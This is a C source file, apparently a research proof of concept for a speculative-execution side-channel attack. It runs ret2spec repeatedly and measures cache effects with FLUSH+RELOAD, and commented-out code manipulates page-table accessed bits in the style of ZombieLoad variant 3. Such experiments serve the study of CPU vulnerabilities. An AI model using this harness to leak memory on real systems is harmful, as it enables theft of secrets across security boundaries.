#include "asm.h"
#define _GNU_SOURCE
#include <assert.h>
#include <stdbool.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#include "constants.h"
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-function"
#include "ptedit_header.h"
#pragma GCC diagnostic pop
#include "flush_and_reload.h"
#include "ret2spec.h"

struct buffers {
  void *arch_page;
  void *microarch_page;
  void *reload;
};

// This function will create three buffers.
// - Two buffers (arch_page and microarch_page) that point to the same
//   physical page. If we clear the accessed bit on the microarch_page, then
//   the CPU will issue a microcode assist to set the accessed bit
//   speculatively (as described in ZombieLoad variant 3).
// - The reload buffer where we will measure the cache effects with
//   FLUSH+RELOAD
struct buffers create_buffers() {
  struct buffers buffers = {0};

 // const int memfd = memfd_create("shared page", 0);
 // assert(memfd != -1);
 // ftruncate(memfd, PAGE_SIZE);
	//
 // void** const same_page_buffers[2] = {&buffers.arch_page, &buffers.microarch_page};
 // for (int i = 0; i < 2; ++i) {
 //   *same_page_buffers[i] = mmap(NULL,
 //                                PAGE_SIZE,
 //                                PROT_READ | PROT_WRITE,
 //                                MAP_SHARED | MAP_POPULATE,
 //                                memfd,
 //                                0);
 //   assert(*same_page_buffers[i] != MAP_FAILED);
 // }

 // // Test if they are mapped to the same page
 // assert(*(char*)buffers.microarch_page == (char)0);
 // *(char*)buffers.arch_page = 0xAA;
 // assert(*(char*)buffers.microarch_page == (char)0xAA);
 // *(char*)buffers.arch_page = 0;

  // The reload buffer that will be used for FLUSH+RELOAD
  buffers.reload = mmap(NULL,
                        PAGE_SIZE * VALUES_IN_BYTE,
                        PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
                        -1,
                        0);
  assert(buffers.reload != MAP_FAILED);

  return buffers;
}

int main() {
  struct buffers buffers = create_buffers();

  size_t results[VALUES_IN_BYTE] = {0};

  // Determine a threshold for when a cache is hot or cold
  // size_t threshold = find_in_cache_threshold();
  size_t threshold = 150;
  assert(threshold > 0);

  // Modifies the access bit of the two pages
  // assert(!ptedit_init());

  // printf("PFNs of the two pages: %lx and %lx\n",
  //   ptedit_pte_get_pfn(buffers.arch_page, 0),
  //   ptedit_pte_get_pfn(buffers.microarch_page, 0));

  // ptedit_pte_set_bit(buffers.arch_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
  // ptedit_pte_clear_bit(buffers.microarch_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
  // ptedit_invalidate_tlb(buffers.arch_page);
  // ptedit_invalidate_tlb(buffers.microarch_page);

  // *(char*)buffers.leak = 0xAA;
  // printf("buffers.leak is at %p\n", buffers.leak);
  // printf("sudo ./pagemap %d %p %p\n", getpid(), (char*)buffers.leak - 1*PAGE_SIZE, (char*)buffers.leak + 1*PAGE_SIZE);

  // clflush(buffers.arch_page);
  for (int i = 0; i < 10000; ++i) {
    flush(VALUES_IN_BYTE, PAGE_SIZE, buffers.reload);
    ret2spec(NULL, buffers.reload);
    reload(VALUES_IN_BYTE, PAGE_SIZE, buffers.reload, results, threshold);
  }

  // bool arch_access = ptedit_pte_get_bit(buffers.arch_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
  // bool microarch_access = ptedit_pte_get_bit(buffers.microarch_page, 0, PTEDIT_PAGE_BIT_ACCESSED);
  // printf("Arch access: %d\tMicroarch access: %d\n", arch_access, microarch_access);
  // ptedit_cleanup();

  printf("Results:\n");
  for (size_t i = 0; i < VALUES_IN_BYTE; ++i) {
    if (results[i] > 0) {
      printf("0x%lx\t%ld\n", i, results[i]);
    }
  }

  return 0;
}
